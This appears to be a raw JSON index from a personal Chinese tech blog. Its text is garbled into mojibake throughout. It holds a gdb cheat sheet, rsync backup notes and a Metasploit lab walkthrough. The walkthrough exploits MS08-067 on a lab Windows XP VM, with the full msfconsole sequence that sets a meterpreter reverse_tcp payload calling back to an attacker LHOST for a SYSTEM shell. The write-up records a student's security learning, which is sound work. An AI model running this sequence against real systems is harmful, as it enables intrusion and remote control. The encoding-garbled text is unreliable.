åœ¨è¡¨è¾¾å¼æ¡ä»¶ä¸‹ï¼Œè®¾ç½®æ–­ç‚¹   delete n åˆ é™¤nå·æ–­ç‚¹   clear n æ¸…é™¤ç¬¬nè¡Œçš„æ–­ç‚¹   disable n æš‚åœç¬¬nä¸ªæ–­ç‚¹   enable n å¼€å¯ç¬¬nä¸ªæ–­ç‚¹   info b æ˜¾ç¤ºç›®å‰ä»ç¨‹åºæ–­ç‚¹æƒ…å†µ   delete breakpoints æ¸…é™¤æ‰€æœ‰æ–­ç‚¹    æŸ¥çœ‹æºä»£ç     gdbå‘½ä»¤ ä½œç”¨     list åˆ—å‡ºç¨‹åºæºä»£ç    list n æ˜¾ç¤ºä»¥å½“å‰ä¸ºè¡Œå·å‰å10è¡Œä»£ç    list func æ˜¾ç¤ºfuncæ‰€åœ¨å‡½æ•°çš„æºä»£ç    list æ¥ç€ä¸Šæ¬¡listå‘½ä»¤è¾“å‡ºä¸‹è¾¹çš„å†…å®¹    æ‰“å°è¡¨è¾¾å¼    gdbå‘½ä»¤ ä½œç”¨     print expr exprå¯ä»¥æ˜¯ä»»ä½•å½“å‰æ­£åœ¨è¢«æµ‹è¯•ç¨‹åºçš„æœ‰æ•ˆè¡¨è¾¾å¼ï¼ŒåŒ…æ‹¬æ•°å­—ã€å˜é‡ã€å‡½æ•°è°ƒç”¨   print a æ‰“å°açš„å€¼   print ++a æŠŠaçš„å€¼+1ï¼Œå¹¶æ˜¾ç¤ºå‡ºæ¥   print test(2) æŠŠ2ä½œä¸ºtestå‡½æ•°çš„å‚æ•°ï¼Œè°ƒç”¨test()å‡½æ•°   display expr åœ¨å•æ­¥è¿è¡Œæ—¶å°†éå¸¸æœ‰ç”¨ï¼Œä½¿ç”¨displayå‘½ä»¤è®¾ç½®ä¸€ä¸ªè¡¨è¾¾å¼åï¼Œå®ƒå°†åœ¨æ¯æ¬¡å•æ­¥è¿›è¡ŒæŒ‡ä»¤åï¼Œç´§æ¥ç€è¾“å‡ºè¢«è®¾ç½®çš„è¡¨è¾¾å¼åŠå€¼   watch expr è®¾ç½®ä¸€ä¸ªç›‘è§†ç‚¹ï¼Œä¸€æ—¦è¢«ç›‘è§†çš„â€œè¡¨è¾¾å¼â€çš„å€¼æ”¹å˜ï¼Œgdbå°†å¼ºè¡Œç»ˆæ­¢æ­£åœ¨è¢«è°ƒè¯•çš„ç¨‹åºã€‚å¦‚ï¼š watch a   whatis func\u0026var æŸ¥è¯¢å˜é‡æˆ–å‡½æ•°   info function æŸ¥è¯¢å‡½æ•°   info locals æ˜¾ç¤ºå½“å‰å †æ ˆé¡µçš„æ‰€æœ‰å˜é‡    æŸ¥è¯¢è¿è¡Œä¿¡æ¯    gdbå‘½ä»¤ ä½œç”¨     where/bt å½“å‰è¿è¡Œçš„å †æ ˆåˆ—è¡¨   bt backtraceï¼Œæ˜¾ç¤ºå½“å‰è°ƒç”¨å †æ ˆ   up/down æ”¹å˜å †æ ˆæ˜¾ç¤ºçš„æ·±åº¦   set args å‚æ•°:æŒ‡å®šè¿è¡Œæ—¶çš„å‚æ•°   show args æŸ¥çœ‹è®¾ç½®å¥½çš„å‚æ•°   info program æ¥æŸ¥çœ‹ç¨‹åºçš„æ˜¯å¦åœ¨è¿è¡Œï¼Œè¿›ç¨‹å·ï¼Œè¢«æš‚åœçš„åŸå›     åˆ†å‰²çª—å£  layoutï¼šç”¨äºåˆ†å‰²çª—å£ï¼Œå¯ä»¥ä¸€è¾¹æŸ¥çœ‹ä»£ç ï¼Œä¸€è¾¹æµ‹è¯•ï¼š layout srcï¼šæ˜¾ç¤ºæºä»£ç çª—å£ layout asmï¼šæ˜¾ç¤ºåæ±‡ç¼–çª—å£ layout regsï¼šæ˜¾ç¤ºæºä»£ç /åæ±‡ç¼–å’ŒCPUå¯„å­˜å™¨çª—å£ layout splitï¼šæ˜¾ç¤ºæºä»£ç å’Œåæ±‡ç¼–çª—å£ Ctrl + Lï¼šåˆ·æ–°çª—å£  ","description":"","tags":["reverse"],"title":"gdb-learning","uri":"/posts/gdb-learning/"},{"categories":[],"content":"0x00 åº è¯¾ä¸Šä½“éªŒäº†ä¸€æŠŠmsfçš„ä¸€å¥—æµç¨‹ï¼Œä½†æ˜¯ç”±äºé¶æœºå·²ç»ä¸Šäº†è¡¥ä¸ï¼Œæ‰€ä»¥å¤±è´¥äº†ï¼Œè¿™æ¬¡æ¥è®°å½•ä¸€ä¸‹Metasploitçš„ä¸€å¥—æ”»å‡»æµç¨‹ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œç½‘ä¸Šæ‰€æœ‰çš„å…¥é—¨ä¹Ÿæ˜¯æ‹¿è¯¾ä¸Šçš„ms08-067 æ¥æµ‹è¯•çš„\né‚£ä¹ˆæˆ‘ä»¬è¿™æ¬¡æ¥å­¦ä¹ ä¸€ä¸‹msfï¼Œå¹¶ä¸”èƒ½ç”¨msfç”¨ç€ms08-067 æ¥è·å–ä¸€ä¸ªxpä¸»æœºçš„cmd\nï¼ˆè¿˜é¡ºä¾¿å­¦å­¦æ€ä¹ˆåŠ å…¥è‡ªå·±çš„exp\n å‚è€ƒï¼š\nMetasploit å®˜ç½‘\nMSF - Github ï¼š msfçš„githubä»“åº“\nMetasploitå…¥é—¨ç³»åˆ—(ä¸€)â€”â€”ä½•ä¸ºMSF\n Metasploitå…¥é—¨ç³»åˆ—(äºŒ)â€”â€”åˆè¯†æ¨¡å—\nMetasploitå…¥é—¨ç³»åˆ—(ä¸‰)â€”â€”åŸºæœ¬å‘½ä»¤\nMetasploitå…¥é—¨ç³»åˆ—(å››)â€”â€”å°ç»“å¤‡æŸ¥\nMetasploitå…¥é—¨ç³»åˆ—(äº”)â€”â€”frp\nMetasploitå…¥é—¨ç³»åˆ—(å…­)â€”â€”æ°¸æ’ä¹‹è“\nMetasploitå…¥é—¨ç³»åˆ—(ä¸ƒ)â€”â€”Armitage\nMetasploitå…¥é—¨ç³»åˆ—(å…«)â€”â€”Meterpreter(ä¸€)\nMetasploitå…¥é—¨ç³»åˆ—(ä¹)â€”â€”Meterpreter(äºŒ)\nMetasploitå…¥é—¨ç³»åˆ—(å)â€”â€”Meterpreter(ä¸‰)\nMetasploitå…¥é—¨ç³»åˆ—(åä¸€)â€”â€”åæ¸—é€æµ‹è¯•\n Metasploit å­¦ä¹ ç¬”è®° ï¼š æ¨¡å—ä»‹ç»\nMeterpreteråˆæ¢ ï¼šMetasploitçš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œåœ¨åæ¸—é€é˜¶æ®µæœ‰å¼ºå¤§çš„æ”»å‡»åŠ›\nåæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥\n 0x01 ä»‹ç» Metasploitæ˜¯ä¸€æ¬¾å¼€æºçš„å®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œmsfå·²ç»å†…ç½®äº†æ•°åƒä¸ª å·²æŠ«éœ²çš„æ¼æ´ç›¸å…³çš„æ¨¡å—å’Œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ¨¡å—ä½¿ç”¨rubyè¯­è¨€ç¼–å†™ï¼Œè¿™ä½¿å¾—ä½¿ç”¨è€…èƒ½å¤Ÿæ ¹æ®éœ€è¦å¯¹æ¨¡å—è¿›è¡Œé€‚å½“ä¿®æ”¹ï¼Œç”šè‡³æ˜¯è°ƒç”¨è‡ªå·±å†™çš„æµ‹è¯•æ¨¡å—ã€‚é€‰å®šéœ€è¦ä½¿ç”¨çš„æ”»å‡»æ¨¡å—ä¹‹åï¼Œä½ åªéœ€è¦ä½¿ç”¨ç®€å•çš„å‘½ä»¤é…ç½®ä¸€äº›å‚æ•°å°±èƒ½å®Œæˆé’ˆå¯¹ä¸€ä¸ªæ¼æ´çš„ æµ‹è¯•å’Œåˆ©ç”¨ï¼Œå°†æ¸—é€çš„è¿‡ç¨‹è‡ªåŠ¨åŒ–ã€ç®€å•åŒ–ã€‚\nä»¥ä¸‹æ˜¯Metasploitä¸ªç‰ˆæœ¬çš„åŒºåˆ«\nkalié‡Œé¢è‡ªå¸¦äº†Metasploit Frameworkï¼Œæˆ‘ä»¬å°±ç›´æ¥æ‹¿æ¥ç”¨äº†\n0x02 äº²çˆ±çš„ms08-067 è¿™æ˜¯ä¸€æ¬¡åˆºæ¿€çš„msfæ”»å‡»æµç¨‹ï¼Œç”¨çš„æ˜¯kali2020.02çš„vmwareç‰ˆæœ¬ï¼ˆè¾“å…¥bannerå‘½ä»¤å¯ä»¥çœ‹åˆ°ä¸åŒä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼‰\né¶æœºæ˜¯ç›´æ¥ä»msdnä¸Šåˆšä¸‹çš„winxp pro sp2ï¼Œé…ç½®å¦‚ä¸‹ï¼Œå†…ç½‘åœ°å€ä¸º192.168.52.135\nç„¶åç”¨kaliçš„nmapæ‰«ä¸€ä¸‹é¶æœºï¼Œå‘ç°å•¥éƒ½æ²¡æ‰«å‡ºæ¥ï¼Œæ’æŸ¥åå‘ç°æ˜¯winxpçš„é˜²ç«å¢™çš„åŸå› ï¼Œå°†å…¶å…³æ‰ï¼Œå°±å‘ç°è¯¥ä¸»æœºäº†\n å½“ç„¶ï¼ŒåŠ å…¥å‘ç°445ç«¯å£è¿˜æ²¡å¼€çš„è¯ï¼Œéœ€è¦å¯¹win xpè¿›è¡Œé…ç½®ä¸€ä¸‹\nç¼–è¾‘æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE=\u003eSYSTEM=\u003eCurrentControlSet=\u003eServices=\u003eNetBT=\u003eParameters\nåœ¨Parametersä¸Šå³é”®æ–°å»ºDWORDå€¼ï¼Œæ•°å€¼ä¸º1ï¼Œé‡å‘½åä¸ºSMBDeviceEnabled\n ç„¶åå‘ç°445ç«¯å£å¼€äº†ä¹‹åå°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†\nåœ¨kaliå¼€å¯msfï¼Œå…ˆæœç´¢ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œç„¶åä½¿ç”¨use\nç„¶åå»æ‰¾ç›¸åº”çš„payload\nç„¶åç”¨setå‘½ä»¤è®¾ç½®å¯¹åº”æ”»å‡»è½½è·payloadï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯reverse_tcpï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºTCPçš„åå‘é“¾æ¥åå¼¹shell, ä½¿ç”¨èµ·æ¥å¾ˆç¨³å®š\nç„¶åç”¨show target ï¼Œæ¥æŸ¥æ‰¾è¯¥æ¼æ´å—å½±å“çš„æœºå™¨ï¼Œå¹¶æ ¹æ®ç›®æ ‡é¶æœºè®¾ç½®è¯¥é€‰é¡¹\nç„¶åç”¨set target 10 æ¥è®¾ç½®ç›®æ ‡é¶æœºçš„ç‰ˆæœ¬\nç”¨show options æŸ¥çœ‹å·²ç»è®¾ç½®æ”»å‡»æ¨¡å¼\nç„¶åè®¾ç½®ç›®æ ‡é¶æœºçš„ipåœ°å€ï¼ŒLHOSTæ˜¯æ”»å‡»ä¸»æœºçš„åœ°å€\n å½“ç”¨æˆ·ä½¿ç”¨Metasploitæ¡†æ¶ä¸­çš„æ¨¡å—æ—¶ï¼Œç»å¸¸éœ€è¦é…ç½®LHOSTå‚æ•°ã€‚å…¶ä¸­ï¼ŒLHOSTå‚æ•°ç”¨æ¥æŒ‡å®šæœ¬åœ°ä¸»æœºIPåœ°å€ã€‚ç”±äºIPåœ°å€ä¸å®¹æ˜“è®°å¿†ï¼Œè€Œä¸”è¾“å…¥ä¹Ÿä¸æ–¹ä¾¿ã€‚æ­¤æ—¶ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨æ¥å£åæ¥ä»£æ›¿ï¼Œå¦‚set LHOST eth0ã€‚å½“ç”¨æˆ·æŒ‡å®šæ¥å£ååï¼Œå°†è‡ªåŠ¨ä½¿ç”¨eth0æ¥å£çš„IPåœ°å€ã€‚\n è¿™è¾¹æ³¨æ„ï¼ŒLHOSTä¸è¦å†™æœ¬åœ°å›ç¯çš„åœ°å€ï¼Œå¦åˆ™ä¼šåƒæˆ‘ä¸€æ ·ç¿»è½¦çš„\nç„¶åç”¨exploitå‘½ä»¤ï¼ŒæˆåŠŸgetshell\nåŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™è¾¹åå°æœ‰ä¸€ä¸ªsystemèµ·çš„cmd.exeï¼Œå³msfæ¸—é€å¾—åˆ°çš„shell\nç®€ç›´å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºï¼Œä¸è¿‡è¯•äº†ä¸‹ï¼Œwindowsè¿™è¾¹è¿˜æ˜¯å¯ä»¥ç»ˆç»“æ‰kaliçš„cmdè¿›ç¨‹\nä¸è¿‡åˆæœ‰è°ä¼šå‘ç°è¿›ç¨‹é‡Œå¤šäº†ä¸€ä¸ªè¿›ç¨‹å‘¢ï¼Œè¿˜æ˜¯systemèµ·çš„\nåé¢çš„meterpreteræ¨¡å—çœŸçš„æ˜¯ä¸‡èƒ½çš„å¥½ç”¨\n å…·ä½“å‘½ä»¤å‚è€ƒï¼šåæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥\n ä¸€æ¬¡å®Œæ•´çš„å‘½ä»¤å°±å¦‚ä¸‹äº†ï¼Œè™½ç„¶æ²¡æœ‰ç½‘ä¸Šçš„åšå®¢ç›´æ¥æ‰“å¼€ä¸€ä¸ªshellï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨åæ¸—é€Meterpreteræ¨¡å—ä¸ºæ‰€æ¬²ä¸ºï¼Œå’Œgetshellæ²¡å•¥å¤§åŒºåˆ«\n1 2 3 4 5 6 7 8 9 10  search ms08-067 use exploit/windows/smb/ms08_067_netapi show payloads set payload windows/meterpreter/reverse_tcp show targets set target 10 show options set RHOST 192.168.52.135 set LHOST 192.168.52.133 exploit   0x03 è®¾ç½®è‡ªå·±çš„exp  å‚è€ƒï¼š\nMetasploit EXPå¼€å‘\nConverting Metasploit Module to Stand Alone ï¼š å…¶ç¿»è¯‘ç‰ˆæœ¬å¦‚ä½•æ”¹å†™msfçš„moduleä¸ºç‹¬ç«‹çš„expï¼Ÿ\nç»™kaliçš„Metasploitä¸‹æ·»åŠ ä¸€ä¸ªæ–°çš„exploit\n è¿™è¾¹å…ˆmarkä¸€ä¸‹ï¼Œä¸‡ä¸€ä»¥åç”¨åˆ°äº†å‘¢/doge\nå…¶expæ˜¯ä½¿ç”¨rubyè¯­è¨€ç¼–å†™çš„ï¼Œå¯ä»¥ä»¿ç…§msfå·²æœ‰çš„expè¿›è¡Œç¼–å†™ï¼Œå­˜æ”¾ä½ç½®å¦‚ä¸‹ï¼š/usr/share/metasploit-framework/modules/exploits/fwdtest\nå†™å®Œæ”¾åˆ°é‡Œé¢åï¼Œåœ¨msfä¸‹é‡æ–°åŠ è½½æ¨¡å—msf \u003e reload_allï¼Œåœ¨ç”¨use xxxå‘½ä»¤èƒ½å¤Ÿè‡ªåŠ¨è¡¥å…¨æ—¶ï¼Œè¯´æ˜æˆåŠŸæ·»åŠ \n0x04 å¸¸ç”¨å‘½ä»¤é“¾æ¥ metasploitå¸¸ç”¨å‘½ä»¤\nmsfconsoleå¸¸ç”¨å‘½ä»¤\nmeterpreterå¸¸ç”¨å‘½ä»¤+è„šæœ¬\n","description":"","tags":[],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["tech"],"content":"0x00 åº æœ€è¿‘ç¡¬ç›˜é¢‘ç¹å´©æºƒï¼Œè®©æˆ‘å¯¹æˆ‘çš„ç”µè„‘äº§ç”Ÿäº†æ‹…å¿§ï¼Œäºæ˜¯å°±å‡†å¤‡æŠŠä¸Šæ¬¡è€å¸ˆè¯´çš„å¤‡ä»½æ¥å®ç°ä¸€ä¸‹ï¼ˆè™½ç„¶ä»¥å‰ä¹Ÿæœ‰å¤‡ä»½ï¼Œä½†è‚¯å®šæ²¡æœ‰ç°åœ¨ç”µè„‘çš„èµ„æ–™å…¨é¢ï¼‰\nä¸»è¦å·¥å…·é‡‡ç”¨çš„æ˜¯Rsyncï¼ˆå½“æ—¶äº†è§£é•œåƒç«™æ—¶äº†è§£åˆ°çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥å®ç°å¢é‡å¤‡ä»½ï¼‰\näº†è§£åˆ°æœ‰ä¸€ä¸ªportableappå¯ä»¥è¿›è¡Œè½¯ä»¶å¤‡ä»½\n é€šè¿‡googleå‚è€ƒå…¶ä»–äººçš„æ–¹æ¡ˆï¼š\nç½‘ä¸Šå¤§å¤šçœ‹åˆ°çš„å·¥å…·éƒ½æ˜¯ï¼šFileSync\nFileSyncæ˜¯ä¸€ä¸ªå¼€æºæ–‡ä»¶å¤¹æ¯”è¾ƒå’ŒåŒæ­¥å·¥å…·ï¼Œæ”¯æŒwindowsã€linuxã€mac\nå®˜ç½‘ï¼šhttps://freefilesync.org/\n   å‚è€ƒèµ„æ–™ï¼š\n ä»…ä¾›å‚è€ƒçš„é˜…è¯»èµ„æ–™(æˆ‘è§‰å¾—å¯èƒ½æ²¡è½¯ç”¨)\nå­˜å‚¨æ–¹æ¡ˆï¼šé€‚ç”¨äºä¸ªäººç”¨æˆ·çš„æœ€ä½³æ•°æ®å¤‡ä»½æ–¹æ¡ˆæœ‰å“ªäº›ï¼Ÿ\nä¸ªäººæ•°æ®å¤‡ä»½æ–¹æ¡ˆ\n å½“å‰å·¥ä½œç¯å¢ƒä¸‹çš„ä¸ªäººæ•°æ®å¤‡ä»½æ–¹æ¡ˆåŠå®è·µ\næ•°æ®å¤‡ä»½ä¸ç¾éš¾æ¢å¤ï¼šæ„Ÿè§‰è¿™ç¯‡æ›´å¤šçš„æ˜¯é’ˆå¯¹ä¼ä¸šçš„æ•°æ®å¤‡ä»½ã€å®¹ç¾\n å…¨å¹³å°çš„å¤‡ä»½æŒ‡å—ï¼Œè®©ä½ ä»æ­¤é‡è£…ä¸å†éš¾ :æåº¦æ¨èçš„å¤‡ä»½æ–¹æ³•ï¼Œè™½ç„¶ä»–çš„æœ¬æ„æ˜¯é¢å¯¹ç³»ç»Ÿé‡è£…çš„  ä¸ªäººæ•°æ®å¤‡ä»½æ–¹æ¡ˆè®¾è®¡\nç®€æ˜“ä¸ªäººæ•°æ®å¤‡ä»½æ–¹æ¡ˆ\nè½¯ä»¶ä½¿ç”¨ ç¯‡äºŒï¼šä¸ªäººæ•°æ®çš„å¤‡ä»½ç»éªŒ1-é€šè¿‡è„šæœ¬è‡ªåŠ¨åŒ–å¤‡ä»½\nå…è´¹ä¸ªäººæ•°æ®å¤‡ä»½è½¯ä»¶ä»‹ç»ï¼šFreeFileSyncã€Syncthing\n DISM++ï¼šDism++ æ˜¯ä¸€æ¬¾ Windows ç³»ç»Ÿç®¡ç†ä¼˜åŒ–å·¥å…·ï¼Œå®ƒè§£å†³äº†æˆ‘ä»¬å®‰è£…ã€ç»´æŠ¤ç³»ç»Ÿçš„ä¸€å¤§ç—›ç‚¹é—®é¢˜â€”â€”è‡ªå®šä¹‰è®¾ç½®å’Œä¼˜åŒ–ã€‚ç›¸å½“äºä¸€ä¸ª â€œä¸€ç«™å¼â€ ç®¡ç†ä¼˜åŒ–å·¥å…·é›†ã€‚\nDism++ ï¼Œå¼ºå¤§çš„ Windows ç³»ç»Ÿä¼˜åŒ–å·¥å…·\nDism++ï¼Œä¹Ÿè®¸æ˜¯æœ€å¼ºçš„å®ç”¨å·¥å…·ï¼šæ±‰åŒ–å®˜ç½‘ï¼Œguiç‰ˆæœ¬\nä¹‹å‰äº†è§£çš„ï¼Œä¸è¿‡ä¹‹åæ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆç”¨äº†ï¼Œå·²ç»å†³å®šä½¿ç”¨scoopäº†\n  Portableappsï¼šä¾¿æºåº”ç”¨ï¼Œé€‚åˆUç›˜éšèº«æºå¸¦è½¯ä»¶\n  ä¹‹å‰è¿˜äº†è§£è¿‡portableAppsï¼Œä¸è¿‡æ„Ÿè§‰å…¶ç•Œé¢UIä¸è¡Œï¼Œè¿˜æ˜¯ä¸»è¦é¢å‘å¯ç§»åŠ¨åº”ç”¨ï¼Œä¸è¿‡å¯ä»¥è‡ªå·±åˆ¶ä½œç›¸å…³çš„portableAppï¼Œåœ¨å…¶å®˜ç½‘ä¸Šéƒ½ç»™å‡ºäº†æ•™ç¨‹\nä½†æ˜¯portableAppsæ„å‘³ç€å°±æ— æ³•ä½¿ç”¨å³é”®èœå•äº†ï¼Œä¹Ÿæ²¡æ³•å‘½ä»¤è¡Œå¿«é€Ÿå¯åŠ¨ï¼Œè¿™æ˜¯æŒºè›‹ç–¼çš„ã€‚ä¸è¿‡è¿™æ˜¯ä¸€ç§å¯ä»¥æ–¹ä¾¿ç§»æ¤åˆ°Uç›˜çš„è§£å†³åŠæ³•\n0x01 ç”¨rsyncå¤‡ä»½ rsyncæ˜¯å¯ä»¥å®ç°å¢é‡å¤‡ä»½çš„å·¥å…·ã€‚é…åˆä»»åŠ¡è®¡åˆ’ï¼Œrsyncèƒ½å®ç°å®šæ—¶æˆ–é—´éš”åŒæ­¥ï¼Œé…åˆinotifyæˆ–sersyncï¼Œå¯ä»¥å®ç°è§¦å‘å¼çš„å®æ—¶åŒæ­¥ã€‚\nrsyncå¯ä»¥å®ç°scpçš„è¿œç¨‹æ‹·è´(rsyncä¸æ”¯æŒè¿œç¨‹åˆ°è¿œç¨‹çš„æ‹·è´ï¼Œä½†scpæ”¯æŒ)ã€cpçš„æœ¬åœ°æ‹·è´ã€rmåˆ é™¤å’Œls -læ˜¾ç¤ºæ–‡ä»¶åˆ—è¡¨ç­‰åŠŸèƒ½ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œrsyncçš„æœ€ç»ˆç›®çš„æˆ–è€…è¯´å…¶åŸå§‹ç›®çš„æ˜¯å®ç°ä¸¤ç«¯ä¸»æœºçš„æ–‡ä»¶åŒæ­¥ï¼Œå› æ­¤å®ç°çš„scp/cp/rmç­‰åŠŸèƒ½ä»…ä»…åªæ˜¯åŒæ­¥çš„è¾…åŠ©æ‰‹æ®µï¼Œä¸”rsyncå®ç°è¿™äº›åŠŸèƒ½çš„æ–¹å¼å’Œè¿™äº›å‘½ä»¤æ˜¯ä¸ä¸€æ ·çš„ã€‚äº‹å®ä¸Šï¼Œrsyncæœ‰ä¸€å¥—è‡ªå·±çš„ç®—æ³•ï¼Œå…¶ç®—æ³•åŸç†ä»¥åŠrsyncå¯¹ç®—æ³•å®ç°çš„æœºåˆ¶å¯èƒ½æ¯”æƒ³è±¡ä¸­è¦å¤æ‚ä¸€äº›ã€‚\nå› æ­¤æˆ‘ä»¬æ¥ä»‹ç»ä¸€æ³¢rsync\n å‚è€ƒï¼š\nrsync -samba.orgï¼šå®˜ç½‘\nthe rsync web pages\nrsync(1) - Linux man page\nç¬¬2ç«  rsync(ä¸€)ï¼šåŸºæœ¬å‘½ä»¤å’Œç”¨æ³•ï¼šå…¨æ–‡ç³»åˆ—åœ¨ï¼š2.Linux åŸºæœ¬æœåŠ¡\nrsyncå‘½ä»¤\nhttps://api.vaipixel.fxcdev.com/archives/216.html\n ä¸‹é¢ä»‹ç»å‡ æ¡å¸¸ç”¨çš„å‘½ä»¤\n1 2 3 4 5 6  $ rsync [OPTION]... SRC DEST $ rsync [OPTION]... SRC [USER@]host:DEST $ rsync [OPTION]... [USER@]HOST:SRC DEST $ rsync [OPTION]... [USER@]HOST::SRC DEST $ rsync [OPTION]... SRC [USER@]HOST::DEST $ rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]   å…¶å®è¿™å‘½ä»¤è·Ÿsshçš„è½¬å‘æŒºåƒçš„ï¼Œéƒ½æ˜¯å›ºå®šä¸€ä¸ªåœ°æ–¹åˆ°å¦ä¸€ä¸ªåœ°æ–¹\n æ‹·è´æœ¬åœ°æ–‡ä»¶ã€‚å½“SRCå’ŒDESè·¯å¾„ä¿¡æ¯éƒ½ä¸åŒ…å«æœ‰å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å°±å¯åŠ¨è¿™ç§å·¥ä½œæ¨¡å¼ã€‚å¦‚ï¼šrsync -a /data /backup ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å½“DSTè·¯å¾„åœ°å€åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -avz *.c foo:src ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†è¿œç¨‹æœºå™¨çš„å†…å®¹æ‹·è´åˆ°æœ¬åœ°æœºå™¨ã€‚å½“SRCåœ°å€è·¯å¾„åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -avz foo:src/bar /data ä»è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­æ‹·è´æ–‡ä»¶åˆ°æœ¬åœ°æœºã€‚å½“SRCè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -av root@192.168.78.192::www /databack ä»æœ¬åœ°æœºå™¨æ‹·è´æ–‡ä»¶åˆ°è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­ã€‚å½“DSTè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -av /databack root@192.168.78.192::www åˆ—è¿œç¨‹æœºçš„æ–‡ä»¶åˆ—è¡¨ã€‚è¿™ç±»ä¼¼äºrsyncä¼ è¾“ï¼Œä¸è¿‡åªè¦åœ¨å‘½ä»¤ä¸­çœç•¥æ‰æœ¬åœ°æœºä¿¡æ¯å³å¯ã€‚å¦‚ï¼šrsync -v rsync://192.168.78.192/www  å…·ä½“é€‰é¡¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  -v, --verbose è¯¦ç»†æ¨¡å¼è¾“å‡ºã€‚ -q, --quiet ç²¾ç®€è¾“å‡ºæ¨¡å¼ã€‚ -c, --checksum æ‰“å¼€æ ¡éªŒå¼€å…³ï¼Œå¼ºåˆ¶å¯¹æ–‡ä»¶ä¼ è¾“è¿›è¡Œæ ¡éªŒã€‚ -a, --archive å½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºä»¥é€’å½’æ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œå¹¶ä¿æŒæ‰€æœ‰æ–‡ä»¶å±æ€§ï¼Œç­‰äº-rlptgoDã€‚ -r, --recursive å¯¹å­ç›®å½•ä»¥é€’å½’æ¨¡å¼å¤„ç†ã€‚ -R, --relative ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¿¡æ¯ã€‚ -b, --backup åˆ›å»ºå¤‡ä»½ï¼Œä¹Ÿå°±æ˜¯å¯¹äºç›®çš„å·²ç»å­˜åœ¨æœ‰åŒæ ·çš„æ–‡ä»¶åæ—¶ï¼Œå°†è€çš„æ–‡ä»¶é‡æ–°å‘½åä¸º~filenameã€‚å¯ä»¥ä½¿ç”¨--suffixé€‰é¡¹æ¥æŒ‡å®šä¸åŒçš„å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚ --backup-dir å°†å¤‡ä»½æ–‡ä»¶(å¦‚~filename)å­˜æ”¾åœ¨åœ¨ç›®å½•ä¸‹ã€‚ -suffix=SUFFIX å®šä¹‰å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚ -u, --update ä»…ä»…è¿›è¡Œæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è·³è¿‡æ‰€æœ‰å·²ç»å­˜åœ¨äºDSTï¼Œå¹¶ä¸”æ–‡ä»¶æ—¶é—´æ™šäºè¦å¤‡ä»½çš„æ–‡ä»¶ï¼Œä¸è¦†ç›–æ›´æ–°çš„æ–‡ä»¶ã€‚ -l, --links ä¿ç•™è½¯é“¾ç»“ã€‚ -L, --copy-links æƒ³å¯¹å¾…å¸¸è§„æ–‡ä»¶ä¸€æ ·å¤„ç†è½¯é“¾ç»“ã€‚ --copy-unsafe-links ä»…ä»…æ‹·è´æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“ã€‚ --safe-links å¿½ç•¥æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“ã€‚ -H, --hard-links ä¿ç•™ç¡¬é“¾ç»“ã€‚ -p, --perms ä¿æŒæ–‡ä»¶æƒé™ã€‚ -o, --owner ä¿æŒæ–‡ä»¶å±ä¸»ä¿¡æ¯ã€‚ -g, --group ä¿æŒæ–‡ä»¶å±ç»„ä¿¡æ¯ã€‚ -D, --devices ä¿æŒè®¾å¤‡æ–‡ä»¶ä¿¡æ¯ã€‚ -t, --times ä¿æŒæ–‡ä»¶æ—¶é—´ä¿¡æ¯ã€‚ -S, --sparse 